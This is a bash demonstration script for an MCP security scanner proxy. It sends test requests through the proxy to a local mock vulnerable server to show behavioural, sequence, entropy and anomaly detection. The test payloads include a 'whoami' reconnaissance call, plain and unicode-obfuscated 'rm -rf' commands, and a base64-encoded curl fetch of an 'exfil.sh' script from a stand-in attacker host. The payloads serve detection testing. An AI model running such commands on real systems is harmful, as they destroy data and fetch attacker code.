#!/bin/bash

# Advanced Traffic Analysis Demonstration Script
# This script demonstrates the sophisticated traffic analysis improvements

set -e

echo "🔬 MCP Security Scanner - Advanced Traffic Analysis Demonstration"
echo "================================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Test configuration
PROXY_PORT=8090
TARGET_PORT=8091
TEST_TIMEOUT=30

echo -e "\n${BLUE}📋 Test Configuration:${NC}"
echo "   - Proxy Port: $PROXY_PORT"
echo "   - Target Port: $TARGET_PORT"
echo "   - Test Timeout: ${TEST_TIMEOUT}s"

# Function to wait for service to be ready
wait_for_service() {
    local url=$1
    local timeout=$2
    echo "⏳ Waiting for service at $url (timeout: ${timeout}s)..."
    
    for i in $(seq 1 $timeout); do
        if curl -s "$url" >/dev/null 2>&1; then
            echo "✅ Service is ready"
            return 0
        fi
        sleep 1
    done
    
    echo "❌ Service not ready after ${timeout}s"
    return 1
}

# Cleanup function
cleanup() {
    echo -e "\n🧹 Cleaning up..."
    if [ ! -z "$MOCK_PID" ]; then
        kill $MOCK_PID 2>/dev/null || true
    fi
    if [ ! -z "$PROXY_PID" ]; then
        kill $PROXY_PID 2>/dev/null || true
    fi
    echo "✅ Cleanup complete"
}

trap cleanup EXIT

echo -e "\n${YELLOW}🔍 Checking prerequisites...${NC}"
if [ ! -f "./mcpscan" ]; then
    echo "❌ mcpscan binary not found. Building..."
    go build -o mcpscan cmd/mcpscan/main.go
fi

if [ ! -f "./mock-mcp-server.py" ]; then
    echo "❌ Mock server not found"
    exit 1
fi

echo "✅ Prerequisites check passed"

echo -e "\n${YELLOW}🎯 Starting mock vulnerable MCP server on port $TARGET_PORT...${NC}"
python3 mock-mcp-server.py --port $TARGET_PORT &
MOCK_PID=$!

if ! wait_for_service "http://localhost:$TARGET_PORT" 5; then
    echo "❌ Failed to start mock server"
    exit 1
fi

echo "✅ Mock server started (PID: $MOCK_PID)"

echo -e "\n${YELLOW}🛡️  Starting MCP proxy with advanced traffic analysis on port $PROXY_PORT...${NC}"
./mcpscan proxy "http://localhost:$TARGET_PORT" $PROXY_PORT &
PROXY_PID=$!
sleep 3

# Verify proxy is running
if ! wait_for_service "http://localhost:$PROXY_PORT/monitor/health" 5; then
    echo "⚠️  Health endpoint not responding, checking basic connectivity..."
    if command -v nc >/dev/null 2>&1; then
        if nc -z localhost $PROXY_PORT 2>/dev/null; then
            echo "✅ Proxy port is open"
        else
            echo "❌ Failed to start proxy"
            exit 1
        fi
    else
        echo "✅ Assuming proxy is running"
    fi
fi

echo "✅ Proxy started (PID: $PROXY_PID)"

echo -e "\n${PURPLE}🔬 Running Advanced Traffic Analysis Tests...${NC}"

# Test 1: Behavioral Pattern Analysis
echo -e "\n${YELLOW}=== Test 1: Behavioral Pattern Detection ===${NC}"
echo "🧪 Testing rapid-fire requests to trigger behavioral analysis..."

for i in {1..15}; do
    curl -s -X POST "http://localhost:$PROXY_PORT/tools/call" \
        -H "Content-Type: application/json" \
        -d '{
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
                "name": "test_tool",
                "arguments": {"command": "echo test_'$i'"}
            },
            "id": '$i'
        }' > /dev/null &
    
    # Small delay between requests to create pattern
    sleep 0.05
done

wait # Wait for all requests to complete
echo "✅ Rapid-fire pattern test completed"

# Test 2: Attack Sequence Detection
echo -e "\n${YELLOW}=== Test 2: Attack Sequence Detection ===${NC}"
echo "🧪 Testing reconnaissance sequence pattern..."

# Step 1: Tools enumeration
curl -s -X POST "http://localhost:$PROXY_PORT/" \
    -H "Content-Type: application/json" \
    -d '{
        "jsonrpc": "2.0",
        "method": "tools/list",
        "id": 100
    }' > /dev/null

sleep 1

# Step 2: Resources enumeration
curl -s -X POST "http://localhost:$PROXY_PORT/" \
    -H "Content-Type: application/json" \
    -d '{
        "jsonrpc": "2.0",
        "method": "resources/list",
        "id": 101
    }' > /dev/null

sleep 1

# Step 3: Information gathering
curl -s -X POST "http://localhost:$PROXY_PORT/tools/call" \
    -H "Content-Type: application/json" \
    -d '{
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "system_info",
            "arguments": {"command": "whoami"}
        },
        "id": 102
    }' > /dev/null

echo "✅ Reconnaissance sequence test completed"

# Test 3: Content Analysis (High Entropy)
echo -e "\n${YELLOW}=== Test 3: Content Analysis ===${NC}"
echo "🧪 Testing high-entropy content detection..."

# Generate base64-like content to trigger entropy analysis
HIGH_ENTROPY_CONTENT="VGhpc0lzQVZlcnlMb25nQmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhIaWdoRW50cm9weVRoYXRTaG91bGRUcmlnZ2VyQWxlcnRz"

curl -s -X POST "http://localhost:$PROXY_PORT/tools/call" \
    -H "Content-Type: application/json" \
    -d '{
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "data_processor",
            "arguments": {"data": "'$HIGH_ENTROPY_CONTENT'"}
        },
        "id": 200
    }' > /dev/null

echo "✅ High-entropy content test completed"

# Test 4: Statistical Anomaly Detection
echo -e "\n${YELLOW}=== Test 4: Statistical Anomaly Detection ===${NC}"
echo "🧪 Testing unusually large payload detection..."

# Create an unusually large payload
LARGE_PAYLOAD='{"jsonrpc":"2.0","method":"tools/call","params":{"name":"large_data_tool","arguments":{"massive_data":"'
for i in {1..50}; do
    LARGE_PAYLOAD+="This is a very long string that will make the payload unusually large compared to normal requests. "
done
LARGE_PAYLOAD+='"}},"id":300}'

curl -s -X POST "http://localhost:$PROXY_PORT/" \
    -H "Content-Type: application/json" \
    -d "$LARGE_PAYLOAD" > /dev/null

echo "✅ Large payload anomaly test completed"

# Test 5: Multi-layered Pattern Detection
echo -e "\n${YELLOW}=== Test 5: Multi-layered Pattern Detection ===${NC}"
echo "🧪 Testing complex attack with multiple detection layers..."

curl -s -X POST "http://localhost:$PROXY_PORT/tools/call" \
    -H "Content-Type: application/json" \
    -d '{
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "shell_command",
            "arguments": {
                "command": "rm -rf /tmp/test",
                "encoded_backup": "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL2V4ZmlsLnNoCg==",
                "unicode_data": "\\u0072\\u006d\\u0020\\u002d\\u0072\\u0066"
            }
        },
        "id": 400
    }' > /dev/null

echo "✅ Multi-layered pattern test completed"

sleep 2

# Check advanced analysis results
echo -e "\n${PURPLE}📊 Advanced Analysis Results${NC}"
echo "==============================================="

# Try to get monitoring data
echo "🔍 Fetching proxy monitoring data..."

if curl -s "http://localhost:$PROXY_PORT/monitor/alerts" 2>/dev/null | jq . >/dev/null 2>&1; then
    echo -e "\n${GREEN}Recent Security Alerts:${NC}"
    curl -s "http://localhost:$PROXY_PORT/monitor/alerts" | jq '.alerts[-5:]' 2>/dev/null || echo "No alerts data available"
else
    echo "⚠️  Alert data not available via API"
fi

if curl -s "http://localhost:$PROXY_PORT/monitor/logs" 2>/dev/null | jq . >/dev/null 2>&1; then
    echo -e "\n${GREEN}Recent Proxy Logs:${NC}"
    curl -s "http://localhost:$PROXY_PORT/monitor/logs" | jq '.logs[-10:]' 2>/dev/null || echo "No log data available"
else
    echo "⚠️  Log data not available via API"
fi

echo -e "\n${PURPLE}🎯 Advanced Traffic Analysis Features Demonstrated:${NC}"
echo "=============================================="
echo "✅ 1. Behavioral Pattern Detection"
echo "   - Rapid-fire request detection"
echo "   - Session-based anomaly tracking"
echo "   - Method frequency analysis"
echo ""
echo "✅ 2. Attack Sequence Detection"
echo "   - Reconnaissance pattern matching"
echo "   - Multi-step attack identification"
echo "   - Temporal sequence analysis"
echo ""
echo "✅ 3. Content Analysis"
echo "   - Shannon entropy calculation"
echo "   - Encoding pattern detection"
echo "   - Obfuscation identification"
echo ""
echo "✅ 4. Statistical Anomaly Detection"
echo "   - Payload size analysis"
echo "   - Request timing patterns"
echo "   - Baseline establishment"
echo ""
echo "✅ 5. Multi-layered Detection"
echo "   - Combined pattern analysis"
echo "   - Confidence scoring"
echo "   - Risk assessment integration"

echo -e "\n${GREEN}🚀 Advanced Traffic Analysis Demonstration Complete!${NC}"
echo ""
echo "Key Improvements over Basic Pattern Matching:"
echo "• Behavioral tracking and anomaly detection"
echo "• Statistical analysis with baseline establishment"
echo "• Attack sequence pattern recognition"
echo "• Content entropy and encoding analysis"
echo "• Session-based risk assessment"
echo "• Confidence scoring and threat prioritization"
echo ""
echo "Next Steps:"
echo "• Review proxy logs for detailed analysis results"
echo "• Tune detection thresholds based on environment"
echo "• Implement machine learning model training"
echo "• Add custom attack sequence definitions"

exit 0
